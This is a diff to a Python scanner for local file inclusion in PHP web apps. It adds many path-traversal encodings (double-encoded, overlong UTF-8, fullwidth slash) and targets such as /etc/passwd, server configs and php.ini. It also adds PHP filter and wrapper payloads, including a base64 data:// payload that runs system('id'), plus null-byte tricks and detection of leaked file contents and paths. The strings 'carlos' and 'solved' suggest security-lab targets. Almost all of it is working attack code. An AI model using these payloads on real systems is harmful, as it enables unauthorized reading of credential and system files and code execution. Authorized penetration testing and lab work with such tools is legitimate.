@@ -84,14 +84,20 @@ class HTTPClient:
         except requests.RequestException:
             return None
     
-    def post(self, url: str, data: Dict, timeout: Optional[int] = None) -> Optional[requests.Response]:
+    def post(self, url: str, data: Optional[Dict] = None, body: Optional[str] = None,
+             headers: Optional[Dict] = None, timeout: Optional[int] = None) -> Optional[requests.Response]:
         try:
-            return self.session.post(
-                url,
-                data=data,
-                timeout=timeout or self.timeout,
-                allow_redirects=self.follow_redirects
-            )
+            kwargs = {
+                'timeout': timeout or self.timeout,
+                'allow_redirects': self.follow_redirects
+            }
+            if body is not None:
+                kwargs['data'] = body
+                if headers:
+                    kwargs['headers'] = headers
+            else:
+                kwargs['data'] = data
+            return self.session.post(url, **kwargs)
         except requests.RequestException:
             return None
 
@@ -116,6 +122,24 @@ class PayloadGenerator:
         "..\x00/",
         "....\\/",
         "..%5c..%5c",
+        "..%255c",
+        "%252e%252e%255c",
+        "..%c0%ae%c0%ae/",          # overlong UTF-8 ../
+        "..%c0%ae%c0%ae%c0%af",    # overlong UTF-8 ../
+        "..%ef%bc%8f",             # fullwidth solidus
+        "%ef%bc%8f%ef%bc%8f",      # fullwidth solidus dot-dot
+        "..%252f%252e%252e%252f",  # double-encoded mix
+        "....//....//....//....//",
+        "....\\/....\\/....\\/....\\/",
+        "..%252f..%252f..%252f..%252f",
+        "%252e%252e%252f%252e%252e%252f%252e%252e%252f",
+        "..././",
+        "..%2f..%2f..%2f",
+        "..%c0%2f",
+        "..%c0%5c",
+        "%c0%ae%c0%ae%c0%af",
+        "/%2e%2e%2f%2e%2e%2f%2e%2e%2f",
+        "/%252e%252e%252f%252e%252e%252f",
     ]
     
     FILE_TARGETS = [
@@ -158,25 +182,43 @@ class PayloadGenerator:
         "C:/wamp/logs/access.log",
         "C:/wamp/logs/error.log",
         "C:/Program Files/Apache Group/Apache2/logs/access.log",
+        "/etc/apache2/apache2.conf",
+        "/etc/nginx/nginx.conf",
+        "/etc/httpd/conf/httpd.conf",
+        "/etc/mysql/my.cnf",
+        "/etc/php/7.4/apache2/php.ini",
+        "/etc/php/8.1/cli/php.ini",
     ]
     
     FILTER_CHAINS = [
         "convert.base64-encode",
+        "convert.base64-decode",
         "string.rot13",
         "string.toupper",
         "string.tolower",
         "string.strip_tags",
         "convert.iconv.utf-8.utf-16",
         "convert.iconv.utf-16.utf-8",
+        "convert.iconv.UTF8.CSISO2022KR",
+        "convert.iconv.CSISO2022KR.UTF8",
         "convert.quoted-printable-encode",
+        "convert.quoted-printable-decode",
         "zlib.deflate",
         "zlib.inflate",
         "bzip2.compress",
         "bzip2.decompress",
+        "convert.iconv.ISO-8859-1.UTF-8",
+        "convert.iconv.UTF-8.ISO-8859-1",
+        "string.rot13|convert.base64-encode",
+        "convert.base64-encode|convert.base64-decode",
+        "convert.iconv.utf-8.utf-16|convert.base64-encode",
+        "convert.iconv.utf-16.utf-8|convert.base64-decode",
+        "zlib.deflate|convert.base64-encode",
     ]
     
     WRAPPER_PAYLOADS = [
         "php://filter/{FILTER}/resource={PATH}",
+        "php://filter/{FILTER}/resource=php://temp",
         "file://{PATH}",
         "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
         "data://text/plain,<?php phpinfo();?>",
@@ -185,59 +227,94 @@ class PayloadGenerator:
         "zip://{PATH}%23test",
         "compress.zlib://{PATH}",
         "compress.bzip2://{PATH}",
+        "php://input",
+        "php://filter/convert.base64-encode/resource={PATH}",
+        "php://filter/string.rot13/resource={PATH}",
+        "php://filter/convert.iconv.utf-8.utf-16/resource={PATH}",
     ]
     
-    NULL_BYTE_VARIANTS = ["%00", "\x00", ";", "?"]
+    NULL_BYTE_VARIANTS = ["%00", "\x00", ";", "?", "&", "%00.jpg", "%00.php", "%00.html", "%2500"]
     
-    def __init__(self, custom_files: Optional[List[str]] = None, target_dir: Optional[str] = None, intensity: str = "normal"):
+    def __init__(self, custom_files: Optional[List[str]] = None, target_dir: Optional[str] = None,
+                 intensity: str = "normal", smart_mode: bool = False, doc_root: Optional[str] = None):
         self.custom_files = custom_files
         self.target_dir = target_dir
         self.intensity = intensity
+        self.smart_mode = smart_mode
+        self.doc_root = doc_root  # set externally after path disclosure
     
     def generate_path_variants(self, file_path: str) -> List[str]:
         variants = set()
-        
+        clean = file_path.lstrip('/')
         variants.add(file_path)
-        variants.add(file_path.lstrip('/'))
+        variants.add(clean)
         
-        for traversal in self.TRAVERSALS:
-            variants.add(f"{traversal}{file_path}")
+        # simple traversals
+        for i in range(1, 8):
+            variants.add(("../" * i) + file_path)
+            variants.add(("../" * i) + clean)
+        for i in [10, 15, 20]:
+            if self.intensity == "aggressive":
+                variants.add(("../" * i) + file_path)
         
-        for i in range(1, 10):
-            padding = "../" * i
-            variants.add(f"{padding}{file_path}")
-            variants.add(f"{padding}{file_path.lstrip('/')}")
+        # specific known web roots with padding
+        web_roots = [
+            "/var/www/html/",
+            "/var/www/",
+            "/var/www/images/",
+            "/var/www/upload/",
+            "/usr/local/apache2/htdocs/",
+            "/home/*/public_html/",
+        ]
+        for root in web_roots:
+            if "*" in root:
+                # skip wildcard for now
+                continue
+            variants.add(root + file_path)
+            variants.add(root + "../../.." + file_path)
         
+        # using mixed slashes
         variants.add(f"....//....//....//....//{file_path}")
         variants.add(f"....\\/....\\/....\\/....\\/{file_path}")
+        variants.add(f"..%2f..%2f..%2f..%2f{clean}")
+        variants.add(f"..%5c..%5c..%5c..%5c{clean}")
         
-        variants.add(f"/var/www/images/../../../..{file_path}")
-        variants.add(f"/var/www/html/../../../..{file_path}")
+        if self.intensity == "aggressive":
+            for overlong in ["..%c0%ae%c0%ae/", "..%c0%ae%c0%ae%c0%af", "%c0%ae%c0%ae%c0%af"]:
+                variants.add(overlong + file_path)
+                variants.add(overlong + clean)
+            variants.add(f"..././..././..././{file_path}")
         
         return list(variants)
     
     def generate_double_encoding_variants(self, file_path: str) -> List[str]:
         variants = set()
+        clean = file_path.lstrip('/')
+        # raw path with double encoded sequences
+        variants.add(f"..%252f..%252f..%252f..%252f{clean}")
+        variants.add(f"..%252f..%252f..%252f..%252f..%252f{clean}")
+        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}")
+        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{clean}")
+        variants.add(f"..%255c..%255c..%255c..%255c{clean}")
+        variants.add(f"%252e%252e%255c%252e%252e%255c{clean}")
         
-        path = f"....//....//....//....//{file_path}"
+        if self.intensity == "aggressive":
+            for i in range(1, 6):
+                pre = "..%252f" * i
+                variants.add(pre + clean)
+            variants.add("%25%32%65%25%32%65%25%32%66" + clean)
         
-        variants.add(urllib.parse.quote(urllib.parse.quote(path)))
-        variants.add(path.replace("/", "%252f"))
-        variants.add(path.replace(".", "%252e").replace("/", "%252f"))
-        variants.add(f"..%252f..%252f..%252f..%252f{file_path}")
-        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file_path}")
-        
+        # also URL-encoded full path
         encoded_path = urllib.parse.quote(file_path)
-        for traversal in ["..%252f", "%252e%252e%252f", "..%252f..%252f..%252f"]:
-            variants.add(f"{traversal}{encoded_path}")
-            variants.add(f"{traversal}{file_path}")
+        variants.add(f"..%252f..%252f..%252f..%252f{encoded_path}")
+        variants.add(f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{encoded_path}")
         
         return list(variants)
     
     def generate_filter_chains(self) -> List[str]:
         chains = []
         for r in range(1, 3):
-            for combo in itertools.permutations(self.FILTER_CHAINS, r):
+            for combo in itertools.permutations(self.FILTER_CHAINS[:15], r):  # limit chains to avoid explosion
                 chains.append("|".join(combo))
         return chains
     
@@ -248,48 +325,64 @@ class PayloadGenerator:
             file_targets = [self.target_dir] + list(file_targets)
         
         filter_chains = self.generate_filter_chains()
+        # limit filter chains for performance
+        if self.intensity == "light":
+            filter_chains = filter_chains[:5]
+        elif self.intensity == "normal":
+            filter_chains = filter_chains[:15]
         
-        for file_target in file_targets:
-            path_variants = self.generate_path_variants(file_target)
-            double_encoded = self.generate_double_encoding_variants(file_target)
-            
+        # First produce high-value direct files and simple traversals
+        for target in file_targets:
+            yield target
+            yield f"....//....//....//....//{target}"
+            yield f"..%252f..%252f..%252f..%252f{target}"
+            yield f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{target}"
+        
+        # Then traverse and encode combos
+        for target in file_targets:
+            path_variants = self.generate_path_variants(target)
+            double_encoded = self.generate_double_encoding_variants(target)
             all_paths = set(path_variants + double_encoded)
             
             for path in all_paths:
                 yield path
-                
-                yield urllib.parse.quote(path)
+                # URL-encoded version
+                yield urllib.parse.quote(path, safe='%')
                 
                 if self.intensity in ["aggressive", "normal"]:
-                    yield urllib.parse.quote(urllib.parse.quote(path))
+                    yield urllib.parse.quote(urllib.parse.quote(path, safe='%'), safe='%')
                 
+                # null byte injections
                 for null in self.NULL_BYTE_VARIANTS:
-                    yield f"{path}{null}"
-                    if self.intensity == "aggressive":
-                        yield f"{path}{null}.php"
-                        yield f"{path}{null}.html"
-                        yield f"{path}{null}.jpg"
+                    if self.intensity == "aggressive" or null in ["%00", "\x00"]:
+                        yield f"{path}{null}"
+                        yield f"{urllib.parse.quote(path, safe='%')}{null}"
                 
+                # extensions bypass
                 if self.intensity == "aggressive":
-                    yield f"{path}."
-                    yield f"{path}./"
-                    yield f"{path}%2500"
+                    for ext in [".", "./", ".php", ".html", ".jpg", ".txt"]:
+                        yield f"{path}{ext}"
+                        yield f"{urllib.parse.quote(path, safe='%')}{ext}"
                 
+                # wrapper injection
                 for wrapper in self.WRAPPER_PAYLOADS:
                     if "{PATH}" in wrapper and "{FILTER}" in wrapper:
-                        for chain in filter_chains[:3]:
+                        for chain in filter_chains[:5]:
                             yield wrapper.replace("{FILTER}", chain).replace("{PATH}", path)
                     elif "{PATH}" in wrapper:
                         yield wrapper.replace("{PATH}", path)
                     else:
                         yield wrapper
         
-        yield "/etc/passwd"
-        yield "....//....//....//....//etc/passwd"
-        yield "..%252f..%252f..%252f..%252fetc/passwd"
-        yield "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
-        yield urllib.parse.quote("....//....//....//....//etc/passwd")
-        yield urllib.parse.quote(urllib.parse.quote("....//....//....//....//etc/passwd"))
+        # Additional aggressive common bypasses
+        if self.intensity == "aggressive":
+            for target in file_targets:
+                # unicode normalization bypasses
+                yield f"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f{target}"
+                yield f"%ef%bc%8f%ef%bc%8f%ef%bc%8f{target}"
+                # overlong UTF-8
+                yield f"..%c0%ae%c0%ae%c0%af{target}"
+                yield f"%c0%ae%c0%ae%c0%af{target}"
 
 
 class ResponseAnalyzer:
@@ -300,6 +393,7 @@ class ResponseAnalyzer:
         "bin:x:2:2": {"type": "LFI", "confidence": 0.9},
         "nobody:x:65534": {"type": "LFI", "confidence": 0.85},
         "carlos:x:": {"type": "LFI", "confidence": 0.95},
+        "carlos:$": {"type": "LFI", "confidence": 0.9},
         "[fonts]": {"type": "LFI", "confidence": 0.9},
         "[extensions]": {"type": "LFI", "confidence": 0.9},
         "[mci extensions]": {"type": "LFI", "confidence": 0.9},
@@ -313,6 +407,13 @@ class ResponseAnalyzer:
         "PHP Version": {"type": "RCE", "confidence": 0.9},
         "Congratulations": {"type": "SUCCESS", "confidence": 1.0},
         "solved": {"type": "SUCCESS", "confidence": 1.0},
+        "Volume Serial Number": {"type": "LFI", "confidence": 0.85},
+        "[boot loader]": {"type": "LFI", "confidence": 0.85},
+        "root::0:0": {"type": "LFI", "confidence": 0.8},
+        "mysql:x:": {"type": "LFI", "confidence": 0.8},
+        "www-data:x:": {"type": "LFI", "confidence": 0.8},
+        "DOCUMENT_ROOT=": {"type": "ENV", "confidence": 0.7},
+        "SERVER_ADMIN": {"type": "ENV", "confidence": 0.7},
     }
     
     ERROR_PATTERNS = [
@@ -323,6 +424,9 @@ class ResponseAnalyzer:
         r"failed to open stream:\s+(.+?)\s+in",
         r"No such file or directory in (.+?) on line",
         r"open_basedir restriction in effect",
+        r"Call to undefined function",
+        r"Undefined variable",
+        r"Cannot modify header information",
     ]
     
     @staticmethod
@@ -330,7 +434,8 @@ class ResponseAnalyzer:
         for pattern in ResponseAnalyzer.ERROR_PATTERNS:
             match = re.search(pattern, content, re.IGNORECASE)
             if match:
-                return match.group(1)
+                path = match.group(1) if match.lastindex else match.group(0)
+                return path.strip()
         return None
     
     @staticmethod
@@ -371,6 +476,11 @@ class ResponseAnalyzer:
         abs_paths = re.findall(r'/(?:[a-zA-Z0-9._-]+/)*[a-zA-Z0-9._-]+\.php', content)
         if abs_paths:
             errors['absolute_paths'] = abs_paths
+        
+        # detect document root from errors
+        doc_match = re.search(r'in\s+(/[\w/.-]+)', content)
+        if doc_match:
+            errors['possible_doc_root'] = doc_match.group(1)
         
         return errors
     
@@ -469,7 +579,8 @@ class LFIScanner:
         target_dir: Optional[str] = None,
         intensity: str = "normal",
         output_file: Optional[str] = None,
-        verbose: bool = False
+        verbose: bool = False,
+        smart_mode: bool = False
     ):
         self.client = client
         self.delay = delay
@@ -486,6 +597,9 @@ class LFIScanner:
         self.intensity = intensity
         self.output_file = output_file
         self.verbose = verbose
+        self.smart_mode = smart_mode
+        self.discovered_paths = set()
+        self.doc_root = None
         
         signal.signal(signal.SIGINT, self._handle_stop)
     
@@ -532,20 +646,29 @@ class LFIScanner:
             return
         
         try:
+            # Custom URL encoding that leaves % unchanged to avoid double-encoding
+            safe_payload = urllib.parse.quote(payload, safe='%')
+            
             if self.method == "GET":
                 parsed = urlparse(url)
                 query_params = parse_qs(parsed.query)
-                query_params[param] = [payload]
+                query_params[param] = [safe_payload]
                 
-                new_query = "&".join([f"{k}={urllib.parse.quote(v[0], safe='')}" for k, v in query_params.items()])
+                new_query = "&".join(
+                    [f"{k}={v[0]}" for k, v in query_params.items()]
+                )
                 full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
-                
                 response = self.client.get(full_url)
             else:
-                post_data = self.post_data.copy()
-                post_data[param] = payload
+                # POST: build raw body with same encoding logic
+                body_data = self.post_data.copy()
+                body_data[param] = safe_payload
+                body = "&".join(
+                    [f"{k}={v}" for k, v in body_data.items()]
+                )
+                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                 full_url = url
-                response = self.client.post(url, post_data)
+                response = self.client.post(url, body=body, headers=headers)
             
             with self.lock:
                 self.tested += 1
@@ -557,6 +680,16 @@ class LFIScanner:
                 response.text,
                 dict(response.headers)
             )
+            
+            # Smart mode: collect path disclosures
+            if self.smart_mode and analysis['details'].get('php_errors'):
+                path = analysis['details']['php_errors'].get('exposed_path')
+                if path and path not in self.discovered_paths:
+                    self.discovered_paths.add(path)
+                    # attempt to extract document root
+                    if not self.doc_root and 'possible_doc_root' in analysis['details']['php_errors']:
+                        self.doc_root = analysis['details']['php_errors']['possible_doc_root']
+                        print(f"\n\033[94m[*] Possible document root: {self.doc_root}\033[0m")
             
             if self.verbose:
                 if analysis['confidence'] > 0.3:
@@ -588,6 +721,8 @@ class LFIScanner:
         print(f"\033[96m[*] Parameter: {param}\033[0m")
         print(f"\033[96m[*] Threads: {self.threads}\033[0m")
         print(f"\033[96m[*] Intensity: {self.intensity}\033[0m")
+        if self.smart_mode:
+            print(f"\033[96m[*] Smart mode: enabled\033[0m")
         
         if self.target_dir:
             print(f"\033[96m[*] Target directory: {self.target_dir}\033[0m")
@@ -600,10 +735,27 @@ class LFIScanner:
         payload_generator = PayloadGenerator(
             custom_files=self.target_files,
             target_dir=self.target_dir,
-            intensity=self.intensity
+            intensity=self.intensity,
+            smart_mode=self.smart_mode,
+            doc_root=self.doc_root
         )
         
-        payloads = list(dict.fromkeys(payload_generator.generate()))
+        # If we discovered document root, adjust target files
+        if self.smart_mode and self.doc_root:
+            # Append relative paths based on doc_root
+            # For simplicity, we'll just note it; more complex logic could be added.
+            pass
+        
+        # Generate payloads with deduplication, keeping order
+        seen = set()
+        payloads = []
+        for pl in payload_generator.generate():
+            if pl not in seen:
+                seen.add(pl)
+                payloads.append(pl)
+                if len(payloads) > 50000:  # safety limit
+                    break
+        
         print(f"\033[96m[*] Generated {len(payloads)} unique payloads\033[0m\n")
         
         animator = ProgressAnimator(self)
@@ -672,6 +824,7 @@ def main():
     parser.add_argument("--intensity", choices=["light", "normal", "aggressive"], default="normal")
     parser.add_argument("--output", help="Save results to JSON file")
     parser.add_argument("--verbose", "-v", action="store_true")
+    parser.add_argument("--smart", action="store_true", help="Smart mode: use path disclosures to optimize payloads")
     
     args = parser.parse_args()
     
@@ -733,7 +886,8 @@ def main():
         target_dir=args.target_dir,
         intensity=args.intensity,
         output_file=args.output,
-        verbose=args.verbose
+        verbose=args.verbose,
+        smart_mode=args.smart
     )
     
     scanner.scan(args.url, args.param)
